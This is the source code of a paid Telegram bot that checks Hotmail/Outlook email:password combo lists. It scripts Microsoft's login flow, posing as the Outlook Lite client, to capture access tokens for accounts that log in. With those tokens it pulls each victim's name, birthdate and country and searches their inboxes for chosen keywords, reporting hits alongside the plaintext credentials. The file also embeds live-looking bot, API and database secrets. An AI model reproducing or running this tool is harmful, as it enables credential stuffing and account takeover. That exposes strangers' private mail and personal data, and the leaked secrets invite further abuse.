import asyncio
import re
import uuid
import time
import json
import logging
import aiohttp
import aiofiles
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple
from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup
from pyrogram.enums import ParseMode, ChatAction
import os
import random
import string
import shutil
from collections import defaultdict
from motor.motor_asyncio import AsyncIOMotorClient
from bson.objectid import ObjectId

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Bot configuration
BOT_TOKEN = "8505518070:AAGj8f5GDZiwbDwGaN3CLvaVeSRY1-6wCmY"
API_ID = 23933044
API_HASH = "6df11147cbec7d62a323f0f498c8c03a"

# Owner information
OWNER_USERNAME = "@still_alivenow"
OWNER_ID = 7125341830

# MongoDB configuration
MONGO_URL = "mongodb+srv://animepahe:animepahe@animepahe.o8zgy.mongodb.net/?retryWrites=true&w=majority"
DATABASE_NAME = "hotmail_checker_bot"

# Thread configuration
MAX_THREADS = 50
BATCH_SIZE = 100

# Free user limits
FREE_DAILY_BATCH_LIMIT = 5

# Initialize bot
app = Client(
    "hotmail_checker_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

# Initialize MongoDB
mongo_client = AsyncIOMotorClient(MONGO_URL)
db = mongo_client[DATABASE_NAME]

# Collections
users_collection = db.users
plans_collection = db.plans
transactions_collection = db.transactions

# Global variables for task management
active_tasks: Dict[int, Dict] = {}
copy_cache = {}
user_hit_counts = defaultdict(lambda: defaultdict(int))

DEFAULT_PLANS = [
    {
        "name": "Basic[TEST]",
        "days": 1,
        "price": "1 USD",
        "batch_limit": 50,
        "features": ["Daily 50 batch checks", "Priority processing"]
    },
    {
        "name": "Premium",
        "days": 7,
        "price": "5 USD",
        "batch_limit": 100,
        "features": ["Daily 100 batch checks", "Priority processing"]
    },
    {
        "name": "Pro",
        "days": 30,
        "price": "15 USD",
        "batch_limit": 250,
        "features": ["Daily 250 batch checks", "High priority", "24/7 Support"]
    },
    {
        "name": "Ultimate",
        "days": 90,
        "price": "35 USD",
        "batch_limit": 1000,
        "features": ["Unlimited batch checks", "Highest priority", "Dedicated support"]
    }
]


# Helper function to format checked by line
def format_checked_by(user_id: int, username: str, full_name: str, is_premium: bool = False) -> str:
    """Format the 'Checked By' line with profile link"""
    if full_name and full_name.strip():
        display_name = full_name.strip()
    elif username and username.strip():
        display_name = f"@{username.strip()}"
    else:
        display_name = f"User {user_id}"
    
    user_type = "Premium" if is_premium else "Free"
    profile_link = f"tg://user?id={user_id}"
    
    return f"✅ **Checked By:** [{display_name}]({profile_link}) [{user_type}]"

# Helper function to format hit message
def format_hit_message(email: str, password: str, profile: Dict, target: str, search_result: Dict, user_id: int, username: str, full_name: str, is_premium: bool) -> str:
    """Format hit message with all details"""
    # Base line
    line = f"`{email}:{password}`"
    
    # Add profile info
    if profile:
        name = profile.get('name', '').strip()
        if name:
            line += f" | Name = {name}"
        
        birthdate = profile.get('birthdate', '').strip()
        if birthdate:
            line += f" | birthDate = {birthdate}"
        
        country = profile.get('country', '').strip()
        if country:
            line += f" | Country = {country}"
    
    # Add target info
    if search_result.get("results"):
        res = search_result["results"]
        line += f" | Target = {target}"
        line += f" | Total = {res.get('total', 0)}"
        line += f" | hasMsgFromTarget = ✔️"
        
        if res.get('preview'):
            preview = res['preview']
            preview = re.sub(r'[\u2000-\u200F\u2028-\u202F\u205F-\u206F\uFEFF\u00AD]', '', preview)
            preview = re.sub(r'\s+', ' ', preview).strip()
            if len(preview) > 80:
                preview = preview[:77] + "..."
            line += f" | Preview = {preview}"
        
        if res.get('last_message_date'):
            line += f" | lastMsg = {res['last_message_date']}"
        
        line += " | BotBy = @still_alivenow"
    
    # Get hit count for this target
    hit_count = user_hit_counts[user_id].get(target, 0)
    
    # Create the full message
    message = (
        f"🎯 **TARGET HIT!**\n"
        f"{get_animation_frame()} **{target.upper()}** Found! **({hit_count} hits)**\n\n"
        f"```\n{line}\n```\n\n"
        f"_Click above to copy_\n\n"
        f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
        f"👑 **Configured by:** {OWNER_USERNAME}"
    )
    
    return message, line

class DatabaseManager:
    @staticmethod
    async def initialize_database():
        """Initialize database with default plans if empty"""
        try:
            plans_count = await plans_collection.count_documents({})
            if plans_count == 0:
                for i, plan in enumerate(DEFAULT_PLANS):
                    plan_data = {
                        "_id": str(i + 1),
                        "name": plan["name"],
                        "days": plan["days"],
                        "price": plan["price"],
                        "batch_limit": plan["batch_limit"],
                        "features": plan["features"],
                        "created_at": datetime.utcnow()
                    }
                    await plans_collection.insert_one(plan_data)
                logger.info("Default plans added to database")
        except Exception as e:
            logger.error(f"Error initializing database: {e}")

    @staticmethod
    async def get_user(user_id: int) -> Dict:
        """Get user from database or create new user"""
        try:
            user = await users_collection.find_one({"_id": str(user_id)})
            
            if not user:
                user_data = {
                    "_id": str(user_id),
                    "username": "",
                    "full_name": "",
                    "join_date": datetime.utcnow(),
                    "subscription": {
                        "plan_id": None,
                        "plan_name": "Free",
                        "expiry_date": None,
                        "batch_limit": FREE_DAILY_BATCH_LIMIT,
                        "used_batch_today": 0,
                        "last_reset_date": datetime.utcnow().date().isoformat()
                    },
                    "stats": {
                        "total_checks": 0,
                        "total_batches": 0,
                        "total_hits": 0,
                        "last_active": datetime.utcnow()
                    },
                    "is_admin": user_id == OWNER_ID
                }
                await users_collection.insert_one(user_data)
                return user_data
            else:
                await DatabaseManager.reset_daily_limit_if_needed(user_id, user)
                return user
        except Exception as e:
            logger.error(f"Error getting user: {e}")
            return None

    @staticmethod
    async def update_user_info(user_id: int, username: str = "", full_name: str = ""):
        """Update user information"""
        try:
            update_data = {}
            if username:
                update_data["username"] = username
            if full_name:
                update_data["full_name"] = full_name
            
            if update_data:
                await users_collection.update_one(
                    {"_id": str(user_id)},
                    {"$set": update_data}
                )
        except Exception as e:
            logger.error(f"Error updating user info: {e}")

    @staticmethod
    async def reset_daily_limit_if_needed(user_id: int, user: Dict = None):
        """Reset daily batch limit if it's a new day"""
        try:
            if not user:
                user = await users_collection.find_one({"_id": str(user_id)})
            
            if user:
                today = datetime.utcnow().date().isoformat()
                last_reset = user.get("subscription", {}).get("last_reset_date")
                
                if last_reset != today:
                    batch_limit = user.get("subscription", {}).get("batch_limit", FREE_DAILY_BATCH_LIMIT)
                    
                    await users_collection.update_one(
                        {"_id": str(user_id)},
                        {
                            "$set": {
                                "subscription.used_batch_today": 0,
                                "subscription.last_reset_date": today,
                                "stats.last_active": datetime.utcnow()
                            }
                        }
                    )
        except Exception as e:
            logger.error(f"Error resetting daily limit: {e}")

    @staticmethod
    async def update_user_stats(user_id: int, check_type: str, hits: int = 0):
        """Update user statistics"""
        try:
            update_data = {
                "$inc": {},
                "$set": {"stats.last_active": datetime.utcnow()}
            }
            
            if check_type == "single":
                update_data["$inc"]["stats.total_checks"] = 1
            elif check_type == "batch":
                update_data["$inc"]["stats.total_batches"] = 1
                update_data["$inc"]["subscription.used_batch_today"] = 1
            
            if hits > 0:
                update_data["$inc"]["stats.total_hits"] = hits
            
            await users_collection.update_one(
                {"_id": str(user_id)},
                update_data
            )
        except Exception as e:
            logger.error(f"Error updating user stats: {e}")

    @staticmethod
    async def can_use_batch(user_id: int) -> Tuple[bool, str]:
        """Check if user can use batch command"""
        try:
            user = await DatabaseManager.get_user(user_id)
            
            if not user:
                return False, "User not found"
            
            if user.get("is_admin"):
                return True, "Admin access"
            
            subscription = user.get("subscription", {})
            plan_id = subscription.get("plan_id")
            expiry_date = subscription.get("expiry_date")
            
            if plan_id and expiry_date:
                if datetime.utcnow() > expiry_date:
                    await DatabaseManager.remove_subscription(user_id)
                    subscription["plan_id"] = None
                    subscription["plan_name"] = "Free"
                    subscription["expiry_date"] = None
                    subscription["batch_limit"] = FREE_DAILY_BATCH_LIMIT
            
            used_today = subscription.get("used_batch_today", 0)
            batch_limit = subscription.get("batch_limit", FREE_DAILY_BATCH_LIMIT)
            
            if used_today >= batch_limit:
                reset_date = subscription.get("last_reset_date")
                if reset_date:
                    reset_time = datetime.fromisoformat(reset_date + "T00:00:00") + timedelta(days=1)
                    remaining = reset_time - datetime.utcnow()
                    hours = int(remaining.total_seconds() // 3600)
                    minutes = int((remaining.total_seconds() % 3600) // 60)
                    return False, f"Daily limit reached. Resets in {hours}h {minutes}m"
                return False, "Daily limit reached"
            
            return True, "OK"
        except Exception as e:
            logger.error(f"Error checking batch permission: {e}")
            return False, f"Error: {str(e)}"

    @staticmethod
    async def is_premium(user_id: int) -> bool:
        """Check if user has active premium subscription"""
        try:
            user = await DatabaseManager.get_user(user_id)
            if not user:
                return False
            
            subscription = user.get("subscription", {})
            plan_id = subscription.get("plan_id")
            expiry_date = subscription.get("expiry_date")
            
            if plan_id and expiry_date:
                if datetime.utcnow() <= expiry_date:
                    return True
            
            return False
        except Exception as e:
            logger.error(f"Error checking premium status: {e}")
            return False

    @staticmethod
    async def add_subscription(user_id: int, plan_id: str):
        """Add subscription to user"""
        try:
            plan = await plans_collection.find_one({"_id": plan_id})
            if not plan:
                return False, "Plan not found"
            
            expiry_date = datetime.utcnow() + timedelta(days=plan["days"])
            
            await users_collection.update_one(
                {"_id": str(user_id)},
                {
                    "$set": {
                        "subscription.plan_id": plan_id,
                        "subscription.plan_name": plan["name"],
                        "subscription.expiry_date": expiry_date,
                        "subscription.batch_limit": plan["batch_limit"],
                        "subscription.used_batch_today": 0,
                        "subscription.last_reset_date": datetime.utcnow().date().isoformat()
                    }
                }
            )
            
            await transactions_collection.insert_one({
                "user_id": str(user_id),
                "plan_id": plan_id,
                "plan_name": plan["name"],
                "price": plan["price"],
                "purchase_date": datetime.utcnow(),
                "expiry_date": expiry_date
            })
            
            return True, "Subscription added successfully"
        except Exception as e:
            logger.error(f"Error adding subscription: {e}")
            return False, f"Error: {str(e)}"

    @staticmethod
    async def remove_subscription(user_id: int):
        """Remove user subscription"""
        try:
            await users_collection.update_one(
                {"_id": str(user_id)},
                {
                    "$set": {
                        "subscription.plan_id": None,
                        "subscription.plan_name": "Free",
                        "subscription.expiry_date": None,
                        "subscription.batch_limit": FREE_DAILY_BATCH_LIMIT,
                        "subscription.used_batch_today": 0
                    }
                }
            )
            return True, "Subscription removed"
        except Exception as e:
            logger.error(f"Error removing subscription: {e}")
            return False, f"Error: {str(e)}"

    @staticmethod
    async def get_all_users() -> List[Dict]:
        """Get all users"""
        try:
            users = []
            async for user in users_collection.find():
                users.append(user)
            return users
        except Exception as e:
            logger.error(f"Error getting all users: {e}")
            return []

    @staticmethod
    async def get_bot_stats() -> Dict:
        """Get bot statistics"""
        try:
            total_users = await users_collection.count_documents({})
            
            active_subscriptions = await users_collection.count_documents({
                "subscription.expiry_date": {"$gt": datetime.utcnow()}
            })
            
            free_users = await users_collection.count_documents({
                "$or": [
                    {"subscription.plan_id": None},
                    {"subscription.expiry_date": {"$lte": datetime.utcnow()}}
                ]
            })
            
            pipeline = [
                {
                    "$group": {
                        "_id": None,
                        "total_checks": {"$sum": "$stats.total_checks"},
                        "total_batches": {"$sum": "$stats.total_batches"},
                        "total_hits": {"$sum": "$stats.total_hits"}
                    }
                }
            ]
            
            stats_result = await users_collection.aggregate(pipeline).to_list(length=1)
            total_stats = stats_result[0] if stats_result else {
                "total_checks": 0,
                "total_batches": 0,
                "total_hits": 0
            }
            
            return {
                "total_users": total_users,
                "active_subscriptions": active_subscriptions,
                "free_users": free_users,
                "total_checks": total_stats["total_checks"],
                "total_batches": total_stats["total_batches"],
                "total_hits": total_stats["total_hits"],
                "timestamp": datetime.utcnow()
            }
        except Exception as e:
            logger.error(f"Error getting bot stats: {e}")
            return {}

    @staticmethod
    async def get_plan(plan_id: str) -> Dict:
        """Get plan by ID"""
        try:
            plan = await plans_collection.find_one({"_id": plan_id})
            return plan
        except Exception as e:
            logger.error(f"Error getting plan: {e}")
            return None

    @staticmethod
    async def get_all_plans() -> List[Dict]:
        """Get all subscription plans"""
        try:
            plans = []
            async for plan in plans_collection.find():
                plans.append(plan)
            return plans
        except Exception as e:
            logger.error(f"Error getting all plans: {e}")
            return []

    @staticmethod
    async def add_plan(plan_data: Dict) -> bool:
        """Add a new subscription plan"""
        try:
            count = await plans_collection.count_documents({})
            plan_data["_id"] = str(count + 1)
            plan_data["created_at"] = datetime.utcnow()
            
            await plans_collection.insert_one(plan_data)
            return True
        except Exception as e:
            logger.error(f"Error adding plan: {e}")
            return False

    @staticmethod
    async def remove_plan(plan_id: str) -> bool:
        """Remove a subscription plan"""
        try:
            result = await plans_collection.delete_one({"_id": plan_id})
            return result.deleted_count > 0
        except Exception as e:
            logger.error(f"Error removing plan: {e}")
            return False

class OutlookProfileChecker:
    def __init__(self, user_id: int = None, debug: bool = False):
        self.user_id = user_id
        self.debug = debug
        self.session = None
        self.uuid = str(uuid.uuid4())
        
    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    def log(self, message: str):
        if self.debug:
            logger.info(f"[DEBUG {self.user_id}] {message}")
    
    async def login_and_get_token(self, email: str, password: str) -> Dict:
        """Step 1-5: Login and get access token"""
        try:
            self.log(f"Starting login for: {email}")
            
            # Step 1: IDP check
            self.log("Step 1: IDP check...")
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": self.uuid,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            
            async with self.session.get(url1, headers=headers1, timeout=15) as r1:
                text1 = await r1.text()
                self.log(f"IDP Response: {r1.status}")
                
                if "Neither" in text1 or "Both" in text1 or "Placeholder" in text1 or "OrgId" in text1:
                    self.log("❌ IDP check failed")
                    return {"status": "BAD", "token": None, "cid": None, "error": "IDP check failed"}
                
                if "MSAccount" not in text1:
                    self.log("❌ MSAccount not found")
                    return {"status": "BAD", "token": None, "cid": None, "error": "MSAccount not found"}
                
                self.log("✅ IDP check successful")
            
            # Step 2: OAuth authorize
            self.log("Step 2: OAuth authorize...")
            await asyncio.sleep(0.5)
            
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            
            async with self.session.get(url2, headers=headers2, allow_redirects=True, timeout=15) as r2:
                text2 = await r2.text()
                
                url_match = re.search(r'urlPost":"([^"]+)"', text2)
                ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', text2)
                
                if not url_match or not ppft_match:
                    self.log("❌ PPFT or URL not found")
                    return {"status": "BAD", "token": None, "cid": None, "error": "PPFT not found"}
                
                post_url = url_match.group(1).replace("\\/", "/")
                ppft = ppft_match.group(1)
            
            # Step 3: Login POST
            self.log("Step 3: Login POST...")
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": url2
            }
            
            async with self.session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15) as r3:
                text3 = await r3.text()
                self.log(f"Login Response: {r3.status}")
                
                if "account or password is incorrect" in text3 or text3.count("error") > 0:
                    self.log("❌ Wrong password")
                    return {"status": "BAD", "token": None, "cid": None, "error": "Wrong password"}
                
                if "https://account.live.com/identity/confirm" in text3:
                    return {"status": "BAD", "token": None, "cid": None, "error": "Identity confirmation required"}
                
                if "https://account.live.com/Abuse" in text3:
                    return {"status": "BAD", "token": None, "cid": None, "error": "Account blocked/abuse"}
                
                location = r3.headers.get("Location", "")
                if not location:
                    self.log("❌ Redirect location not found")
                    return {"status": "BAD", "token": None, "cid": None, "error": "No redirect location"}
                
                code_match = re.search(r'code=([^&]+)', location)
                if not code_match:
                    self.log("❌ Auth code not found")
                    return {"status": "BAD", "token": None, "cid": None, "error": "Auth code not found"}
                
                code = code_match.group(1)
                self.log(f"✅ Auth code obtained: {code[:30]}...")
                
                # Get cookies from session
                mspcid = None
                for cookie in self.session.cookie_jar:
                    if cookie.key == "MSPCID":
                        mspcid = cookie.value
                        break
                
                if not mspcid:
                    self.log("❌ CID not found")
                    return {"status": "BAD", "token": None, "cid": None, "error": "CID not found"}
                
                cid = mspcid.upper()
                self.log(f"CID: {cid}")
            
            # Step 4: Get token
            self.log("Step 4: Getting token...")
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            
            async with self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", 
                                        data=token_data, 
                                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                                        timeout=15) as r4:
                text4 = await r4.text()
                
                if "access_token" not in text4:
                    self.log(f"❌ Access token not received")
                    return {"status": "BAD", "token": None, "cid": None, "error": "No access token"}
                
                token_json = json.loads(text4)
                access_token = token_json["access_token"]
                self.log(f"✅ Token obtained successfully")
                
                return {
                    "status": "SUCCESS",
                    "token": access_token,
                    "cid": cid,
                    "email": email
                }
                
        except asyncio.TimeoutError:
            self.log("❌ Timeout")
            return {"status": "TIMEOUT", "token": None, "cid": None, "error": "Timeout"}
        except Exception as e:
            self.log(f"❌ Exception: {str(e)}")
            return {"status": "ERROR", "token": None, "cid": None, "error": str(e)}
    
    async def get_profile_info(self, access_token: str, cid: str) -> Dict:
        """Step 6: Get profile information from V1Profile API"""
        try:
            self.log("Step 6: Getting profile information...")
            
            profile_headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "ForceSync": "false",
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Host": "substrate.office.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            
            async with self.session.get(
                "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                headers=profile_headers,
                timeout=15
            ) as response:
                if response.status != 200:
                    self.log(f"❌ Profile API failed: {response.status}")
                    return {"status": "ERROR", "profile": None, "error": f"HTTP {response.status}"}
                
                profile_data = await response.json()
                self.log(f"✅ Profile data received")
                
                # Parse profile data
                name = ""
                country = ""
                birthdate = ""
                
                # Extract name from names array
                if "names" in profile_data and len(profile_data["names"]) > 0:
                    name_data = profile_data["names"][0]
                    if "displayName" in name_data:
                        name = name_data["displayName"]
                
                # Extract country and birthdate from accounts array
                if "accounts" in profile_data and len(profile_data["accounts"]) > 0:
                    account_data = profile_data["accounts"][0]
                    
                    if "location" in account_data:
                        country = account_data["location"]
                    
                    if all(key in account_data for key in ["birthDay", "birthMonth", "birthYear"]):
                        birth_day = account_data["birthDay"]
                        birth_month = account_data["birthMonth"]
                        birth_year = account_data["birthYear"]
                        birthdate = f"{birth_day}-{birth_month}-{birth_year}"
                
                return {
                    "status": "SUCCESS",
                    "profile": {
                        "name": name,
                        "country": country,
                        "birthdate": birthdate,
                        "raw_data": profile_data
                    }
                }
                
        except Exception as e:
            self.log(f"❌ Profile error: {str(e)}")
            return {"status": "ERROR", "profile": None, "error": str(e)}
    
    async def search_inbox(self, access_token: str, cid: str, search_query: str) -> Dict:
        """Search inbox for specific keywords"""
        try:
            self.log(f"Searching inbox for: {search_query}")
            
            search_headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "ForceSync": "false",
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Host": "substrate.office.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "Content-Type": "application/json"
            }
            
            # Search payload
            search_payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "Pacific Standard Time",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {
                        "Or": [
                            {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                            {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                        ]
                    },
                    "From": 0,
                    "Query": {"QueryString": search_query},
                    "RefiningQueries": None,
                    "Size": 25,
                    "Sort": [
                        {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                        {"Field": "Time", "SortDirection": "Desc"}
                    ],
                    "EnableTopResults": True,
                    "TopResultsCount": 3
                }],
                "QueryAlterationOptions": {
                    "EnableSuggestion": True,
                    "EnableAlteration": True,
                    "SupportedRecourseDisplayTypes": [
                        "Suggestion", "NoResultModification", 
                        "NoResultFolderRefinerModification", "NoRequeryModification", "Modification"
                    ]
                },
                "LogicalId": str(uuid.uuid4())
            }
            
            async with self.session.post(
                "https://outlook.live.com/searchservice/api/v2/query?n=88&cv=z%2B4rC2Rg7h%2BxLG28lplshj.124",
                headers=search_headers,
                json=search_payload,
                timeout=30
            ) as response:
                if response.status != 200:
                    self.log(f"❌ Search API failed: {response.status}")
                    return {"status": "ERROR", "results": None, "error": f"HTTP {response.status}"}
                
                search_results = await response.json()
                self.log(f"✅ Search results received")
                
                # Parse search results
                return await self._parse_search_results(search_query, search_results)
                
        except Exception as e:
            self.log(f"❌ Search error: {str(e)}")
            return {"status": "ERROR", "results": None, "error": str(e)}
    
    async def _parse_search_results(self, search_query: str, search_results: Dict) -> Dict:
        """Parse search results from API response"""
        try:
            total_results = 0
            has_results = False
            last_message_date = ""
            preview_text = ""
            senders = set()
            items_count = 0
            
            if "EntitySets" in search_results:
                for entity_set in search_results["EntitySets"]:
                    if "ResultSets" in entity_set:
                        for result_set in entity_set["ResultSets"]:
                            if "Total" in result_set:
                                total_results = result_set["Total"]
                            
                            if "Results" in result_set and len(result_set["Results"]) > 0:
                                has_results = True
                                items_count = len(result_set["Results"])
                                
                                first_item = result_set["Results"][0]
                                
                                if "Source" in first_item:
                                    source = first_item["Source"]
                                    
                                    if "LastDeliveryOrRenewTime" in source:
                                        last_message_date = source["LastDeliveryOrRenewTime"]
                                    elif "LastDeliveryTime" in source:
                                        last_message_date = source["LastDeliveryTime"]
                                    
                                    if "Preview" in source:
                                        preview_text = source["Preview"]
                                    elif "HitHighlightedSummary" in first_item:
                                        preview_text = first_item["HitHighlightedSummary"]
                                    
                                    if "UniqueSenders" in source:
                                        senders.update(source["UniqueSenders"])
                                    elif "From" in source and "EmailAddress" in source["From"]:
                                        if "Name" in source["From"]["EmailAddress"]:
                                            senders.add(source["From"]["EmailAddress"]["Name"])
                            
                            elif "Items" in result_set and len(result_set["Items"]) > 0:
                                has_results = True
                                items_count = len(result_set["Items"])
                                
                                first_item = result_set["Items"][0]
                                
                                if "LastMessageTime" in first_item:
                                    last_message_date = first_item["LastMessageTime"]
                                elif "LastDeliveryTime" in first_item:
                                    last_message_date = first_item["LastDeliveryTime"]
                                
                                if "Preview" in first_item:
                                    preview_text = first_item["Preview"]
                                elif "Snippet" in first_item:
                                    preview_text = first_item["Snippet"]
                                
                                if "UniqueSenders" in first_item:
                                    senders.update(first_item["UniqueSenders"])

            if preview_text:
                preview_text = re.sub(r'[\u2000-\u200F\u2028-\u202F\u205F-\u206F\uFEFF\u00AD]', '', preview_text)
                preview_text = re.sub(r'\s+', ' ', preview_text).strip()
            
            if last_message_date:
                try:
                    if 'T' in last_message_date:
                        date_part = last_message_date.split('T')[0]
                        last_message_date = date_part
                except:
                    pass
            
            found_messages = {
                "total": total_results,
                "has_results": has_results,
                "last_message_date": last_message_date,
                "preview": preview_text,
                "senders": list(senders),
                "items_count": items_count
            }
            
            return {
                "status": "SUCCESS",
                "search_query": search_query,
                "results": found_messages if has_results else None,
                "has_results": has_results
            }
            
        except Exception as e:
            self.log(f"❌ Parse error: {str(e)}")
            return {
                "status": "ERROR",
                "search_query": search_query,
                "results": None,
                "has_results": False,
                "error": str(e)
            }
    
    async def check_account(self, email: str, password: str, search_queries: List[str] = None) -> Dict:
        """Complete account check with profile and inbox search"""
        try:
            # Step 1-5: Login and get token
            login_result = await self.login_and_get_token(email, password)
            if login_result["status"] != "SUCCESS":
                return login_result
            
            access_token = login_result["token"]
            cid = login_result["cid"]
            
            # Step 6: Get profile info
            profile_result = await self.get_profile_info(access_token, cid)
            
            # Step 7-8: Search inbox for queries
            search_results = {}
            if search_queries:
                for query in search_queries:
                    search_result = await self.search_inbox(access_token, cid, query)
                    search_results[query] = search_result
            
            # Combine all results
            return {
                "status": "SUCCESS",
                "email": email,
                "password": password,
                "profile": profile_result.get("profile") if profile_result["status"] == "SUCCESS" else None,
                "searches": search_results,
                "token": access_token,
                "cid": cid
            }
            
        except Exception as e:
            self.log(f"❌ Complete check error: {str(e)}")
            return {"status": "ERROR", "error": str(e), "email": email, "password": password}

# Task management functions
def is_user_busy(user_id: int) -> bool:
    """Check if user has an active task"""
    return user_id in active_tasks

def add_task(user_id: int, task_type: str, data: Dict):
    """Add task to active tasks"""
    active_tasks[user_id] = {
        "type": task_type,
        "data": data,
        "start_time": time.time(),
        "running": True
    }

def remove_task(user_id: int):
    """Remove task from active tasks"""
    if user_id in active_tasks:
        del active_tasks[user_id]

def stop_user_task(user_id: int):
    """Stop user's task"""
    if user_id in active_tasks:
        active_tasks[user_id]["running"] = False
        return True
    return False

# UI Helper functions
ANIMATION_FRAMES = ["⣾", "⣷", "⣯", "⣟", "⡿", "⢿", "⣻", "⣽"]
PROGRESS_BAR = "█"
EMPTY_BAR = "░"

def create_progress_bar(percentage: float, width: int = 20) -> str:
    """Create a visual progress bar"""
    filled = int(width * percentage / 100)
    bar = PROGRESS_BAR * filled + EMPTY_BAR * (width - filled)
    return f"`[{bar}] {percentage:.1f}%`"

def get_animation_frame() -> str:
    """Get next animation frame"""
    current_frame = random.choice(ANIMATION_FRAMES)
    return f"**{current_frame}**"

def create_main_keyboard(user_id: int = None) -> InlineKeyboardMarkup:
    """Create main menu keyboard"""
    keyboard = [
        [
            InlineKeyboardButton("🔍 Single Check", callback_data="single_check"),
            InlineKeyboardButton("📁 Batch Check", callback_data="batch_check")
        ],
        [
            InlineKeyboardButton("🎫 My Plan", callback_data="my_plan"),
            InlineKeyboardButton("💎 Plans", callback_data="plans")
        ],
        [
            InlineKeyboardButton("🛑 Stop Task", callback_data="stop_task"),
            InlineKeyboardButton("📊 Status", callback_data="status")
        ],
        [
            InlineKeyboardButton("📖 Help", callback_data="help"),
            InlineKeyboardButton("👑 Owner", url=f"tg://user?id={OWNER_ID}")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def create_back_keyboard() -> InlineKeyboardMarkup:
    """Create back to main menu keyboard"""
    keyboard = [
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)

def create_copy_keyboard(text_to_copy: str) -> InlineKeyboardMarkup:
    """Create copy keyboard with working copy button"""
    copy_id = str(uuid.uuid4())
    copy_cache[copy_id] = text_to_copy
    
    keyboard = [
        [
            InlineKeyboardButton("📋 Copy Result", callback_data=f"copy_{copy_id}"),
            InlineKeyboardButton("🔄 New Check", callback_data="new_check")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def format_credits() -> str:
    """Format owner credits"""
    credits = f"""
    ┌─────────────────┐
    │   **CREDITS**   │
    ├─────────────────┤
    │ • **Owner**: {OWNER_USERNAME}
    │ • **Bot**: @genzhotmailchkbot
    │ • **Version**: 3.0
    └─────────────────┘
    """
    return credits

async def send_typing_animation(chat_id: int, duration: int = 2):
    """Send typing animation"""
    await app.send_chat_action(chat_id, ChatAction.TYPING)
    await asyncio.sleep(duration)

async def send_thinking_animation(chat_id: int):
    """Send thinking animation"""
    await app.send_chat_action(chat_id, ChatAction.CHOOSE_STICKER)
    await asyncio.sleep(1)

async def process_single_account(email: str, password: str, targets: List[str]) -> Dict:
    """Process single account"""
    try:
        async with OutlookProfileChecker(debug=False) as checker:
            return await checker.check_account(email, password, targets)
    except Exception as e:
        return {"status": "ERROR", "error": str(e), "email": email, "password": password}

async def batch_worker(user_id: int, accounts: List[Tuple[str, str]], targets: List[str], message: Message):
    """Process batch accounts with 50 concurrent workers"""
